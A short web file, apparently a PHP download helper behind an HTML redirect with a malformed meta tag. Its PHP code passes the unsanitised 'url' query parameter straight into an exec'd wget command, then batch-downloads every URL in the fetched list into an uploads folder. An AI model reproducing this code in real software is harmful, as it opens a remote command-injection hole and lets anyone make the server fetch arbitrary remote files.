<head>
meta http-equiv="refresh" content="0; url=/" />
</head>
<a href="/">manual redirect</a>

<?php
  $target_dir = "uploads/";
  $output_list = "external.list";

  exec("mkdir -p ".$target_dir);
  exec("chmod +x bash/*");
  exec('wget -O '.$output_list.' "'.$_GET['url'].'"');
  chdir($target_dir);
  exec('wget -i ../'.$output_list.' >/dev/null 2>/dev/null &');
?>
